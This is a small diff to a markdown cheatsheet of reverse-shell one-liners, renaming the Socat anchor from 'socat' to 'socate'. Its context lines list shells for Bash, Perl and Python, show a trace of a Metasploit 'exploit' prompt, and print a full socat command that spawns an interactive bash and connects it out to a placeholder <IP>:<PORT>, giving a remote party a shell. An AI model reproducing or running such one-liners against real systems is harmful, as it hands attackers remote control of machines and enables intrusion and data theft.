@@ -1,7 +1,7 @@
 # Cheatsheet for Reverse-shell one-liner
 
 ## Table of contents
-* [Socat](#socat)
+* [Socat](#socate)
 * [Bash](#bash)
 * [Perl](#perl)
 * [Python](#python)
@@ -37,7 +37,7 @@ msf5 > exploit
 ```
 
 ## Reverse-shell one-liner
-### Socat <a name="socat"></a>
+### Socat <a name="socate"></a>
 Full interactive shell !!!
 ```bash
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>
